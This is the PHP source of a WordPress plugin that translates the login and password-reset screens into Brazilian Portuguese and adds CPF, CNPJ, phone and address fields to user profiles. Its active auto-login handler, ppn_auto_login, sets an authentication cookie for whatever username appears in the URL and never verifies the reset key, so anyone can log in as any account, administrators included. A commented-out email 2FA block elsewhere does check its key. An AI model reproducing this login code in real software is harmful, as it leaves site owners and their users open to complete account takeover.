<?php
/**
 * Plugin Name: Update Profile WP
 * Description: Plugin para personalizar as páginas de login, cadastro, recuperação de senha e perfis de usuários para o padrão brasileiro.
 * Version: 2.4
 * Author: Ivon Filho
 * License: GPLv2 or later
 * License URI: http://www.gnu.org/licenses/gpl-2.0.html
 */

 // Não permitir acesso direto ao arquivo
defined('ABSPATH') or die('Acesso negado.');

define('LOGIN_PERSONALIZADO_PLUGIN_FILE', plugin_basename(__FILE__));

require_once plugin_dir_path(__FILE__) . 'includes/estilos-css-js.php';

function ppn_adicionar_jquery_login() {
wp_enqueue_script('jquery', 'https://code.jquery.com/jquery-3.6.0.min.js', array(), null, false);
}
add_action('login_enqueue_scripts', 'ppn_adicionar_jquery_login');

function ppn_adicionar_estilos_scripts() {
wp_enqueue_style('ppn-estilos', plugins_url('css/estilos.css', __FILE__));
wp_enqueue_script('ppn-scripts', plugins_url('js/scripts.js', __FILE__), array('jquery'), '1.0');
}
add_action('login_enqueue_scripts', 'ppn_adicionar_estilos_scripts');

// ADICIONANDO CAMPOS NATIVOS - CPF, CNPJ, ENDEREÇO E TELEFONES (FIXO E CELULAR)

// Adiciona campos personalizados aos Dados de Contato do Usuário
function custom_user_contactmethods($contact_methods) {
// Adiciona campos CPF e CNPJ
$contact_methods['cpf'] = 'CPF';
$contact_methods['cnpj'] = 'CNPJ';

// Adiciona outros campos
$contact_methods['telefone'] = 'Telefone';
$contact_methods['celular'] = 'Celular';

// Adiciona dados pessoais
$contact_methods['data_nascimento'] = 'Data de Nascimento';

//Endereço
$contact_methods['cep'] = 'CEP';
$contact_methods['endereco'] = 'Endereço';
$contact_methods['cidade'] = 'Cidade';
$contact_methods['bairro'] = 'Bairro';
$contact_methods['numero'] = 'Número';
$contact_methods['complemento'] = 'Complemento';
$contact_methods['estado'] = 'Estado';

return $contact_methods;
}
add_filter('user_contactmethods', 'custom_user_contactmethods');


function ppn_alterar_login_form_labels($translated_text, $text, $domain) {
if ('wp-login.php' === $GLOBALS['pagenow']) {
switch ($text) {
case 'Username or Email Address':
$translated_text = 'E-mail ou usuário';
break;
case 'Password':
$translated_text = 'Senha';
break;
case 'Lost your password?':
$translated_text = 'Recuperar senha';
break;
case 'Remember Me':
$translated_text = 'Lembrar-me';
break;
case 'Log In':
$translated_text = 'Acessar painel';
break;
case 'Please enter your username or email address. You will receive an email message with instructions on how to reset your password.':
$translated_text = 'Por favor, insira o seu e-mail para receber um link para acesso ao painel do site.';
break;
case 'Get New Password':
$translated_text = 'Atualizar senha';
break;
case 'digite um nome de usuário ou endereço de e-mail.':
$translated_text = 'Usuário inválido!';
break;
case 'Acessar':
$translated_text = 'Fazer Login';
break;
// Adicione mais traduções personalizadas conforme necessário
}
}

return $translated_text;
}
add_filter('gettext', 'ppn_alterar_login_form_labels', 10, 3);

function ppn_personalizar_mensagens_erro($erro) {

if(strpos($erro, 'digite um nome de usuário ou endereço de e-mail') !== false) {
$erro = 'Por favor, insira seu e-mail!';
} elseif(strpos($erro, 'não existe uma conta com este nome de usuário ou endereço de e-mail.') !== false) {
$erro = 'Este usuário não está cadastrado!';
} elseif(strpos($erro, 'o campo do nome de usuário está vazio.') !== false) {
$erro = 'E-mail não foi preenchido!';
} elseif(strpos($erro, 'o campo da senha está vazio.') !== false) {
$erro = 'Senha não foi preenchida!';
} elseif(strpos($erro, 'a senha que você digitou para o nome de usuário') !== false) {
$erro = 'E-mail ou senha inválidos!';
} elseif(strpos($erro, 'Não existe uma conta com este nome de CIM ou CPF') !== false) {
$erro = __('Dados incorretos!', 'seu-text-domain');
}
return $erro;
}
add_filter('login_errors', 'ppn_personalizar_mensagens_erro');


// Redefinição de senhas com link de autologin
function ppn_personalizar_email_redefinicao_senha($message, $key, $user_login, $user_data) {
$message = 'Olá ' . $user_data->display_name . ',' . "\r\n\r\n";
$message .= 'Você solicitou atualização do seu cadastro para o usuário: ' . $user_login . '' . "\r\n\r\n";
$message .= 'Para fazer login e atualizar seus dados cadastrais, clique no link abaixo:' . "\r\n\r\n";
$message .= network_site_url("wp-login.php?action=auto_login&key=$key&login=" . rawurlencode($user_login), 'login') . "\r\n\r\n";
$message .= 'Se você não solicitou a redefinição de senha, por favor, ignore este e-mail.' . "\r\n\r\n";
$message .= 'Atenciosamente,' . "\r\n";
$message .= get_bloginfo('name') . "\r\n";

return $message;
}
add_filter('retrieve_password_message', 'ppn_personalizar_email_redefinicao_senha', 10, 4);

function ppn_auto_login() {
if (isset($_GET['action']) && $_GET['action'] === 'auto_login' && !is_user_logged_in()) {
if (isset($_GET['login'], $_GET['key'])) {
$user_login = sanitize_user($_GET['login']);
$user = get_user_by('login', $user_login);
if ($user) {
// Aqui você pode adicionar uma verificação adicional para a chave se necessário
wp_set_auth_cookie($user->ID, false);
wp_safe_redirect(home_url('/'));
exit;
}
}
}
}
add_action('init', 'ppn_auto_login');


// 2FA via e-mail para usuários administradores
/*
function ppn_detect_admin_login($user, $username, $password) {
if (is_a($user, 'WP_User')) {
if (in_array('administrator', $user->roles)) {
// Se for um administrador, envie o e-mail e não permita o login direto
ppn_send_admin_auto_login_email($user);
return new WP_Error('authentication_required', '<b>2FA:</b> Por favor, verifique seu e-mail para poder acessar o sistema através do link de acesso.');
}
}
return $user;
}
add_filter('authenticate', 'ppn_detect_admin_login', 30, 3);

function ppn_send_admin_auto_login_email($user) {
$auto_login_key = wp_generate_password(20, false);

// Guardar a chave de auto-login temporariamente para o usuário
update_user_meta($user->ID, '_auto_login_key', $auto_login_key);

$auto_login_url = add_query_arg([
'action' => 'admin_auto_login',
'user_id'=> $user->ID,
'key'=> $auto_login_key
], wp_login_url());

$message = "Clique no link abaixo para acessar o painel administrativo:\n\n";
$message .= $auto_login_url;

wp_mail($user->user_email, 'Link de Acesso', $message);
}

function ppn_process_admin_auto_login() {
if (isset($_GET['action']) && $_GET['action'] === 'admin_auto_login' && !is_user_logged_in()) {
$user_id = absint($_GET['user_id']);
$key = sanitize_text_field($_GET['key']);

$stored_key = get_user_meta($user_id, '_auto_login_key', true);
if ($stored_key === $key) {
// Se a chave corresponder, permita o login
wp_set_auth_cookie($user_id, false);

// Remova a chave de auto-login, pois ela não é mais necessária
delete_user_meta($user_id, '_auto_login_key');

wp_safe_redirect(admin_url());
exit;
}
}
}
add_action('init', 'ppn_process_admin_auto_login');
*/

// Altera a URL do logotipo no formulário de login
function custom_login_logo_url() {
return home_url();
}
add_filter('login_headerurl', 'custom_login_logo_url');

// Altera o título ao passar o mouse sobre o logotipo no formulário de login
function custom_login_logo_url_title() {
return get_bloginfo('name');
}
add_filter('login_headertext', 'custom_login_logo_url_title');

// Redireciona usuários logados para a home
function redirect_logged_in_users() {
if ( is_user_logged_in() && ( $GLOBALS['pagenow'] === 'wp-login.php' ) && ( !isset( $_GET['action'] ) || $_GET['action'] !== 'logout' ) ) {
wp_redirect( home_url() ); // redireciona para a página inicial
exit; // garante que o WordPress pare de processar depois do redirecionamento
}
}
add_action( 'init', 'redirect_logged_in_users' );

// Removendo camps do Yoast
add_filter('user_contactmethods', 'remove_yoast_user_contactmethods', 9999);

function remove_yoast_user_contactmethods($contactmethods) {
unset($contactmethods['facebook']);
unset($contactmethods['instagram']);
unset($contactmethods['linkedin']);
unset($contactmethods['myspace']);
unset($contactmethods['pinterest']);
unset($contactmethods['soundcloud']);
unset($contactmethods['tumblr']);
unset($contactmethods['twitter']);
unset($contactmethods['youtube']);
unset($contactmethods['wikipedia']);

return $contactmethods;
}

// Definindo a paleta de cores moderna como padrão
// Função para atualizar a paleta de cores para "moderna"
function update_all_users_to_modern_color() {
$users = get_users();

foreach($users as $user) {
update_user_option($user->ID, 'admin_color', 'modern', true);
}
}

// Atualiza a paleta de cores para "moderna" quando o plugin for ativado
register_activation_hook(__FILE__, 'update_all_users_to_modern_color');

// Função vazia para demonstração ao desativar o plugin
function on_deactivation() {
// Código a ser executado ao desativar o plugin, se necessário
}
register_deactivation_hook(__FILE__, 'on_deactivation');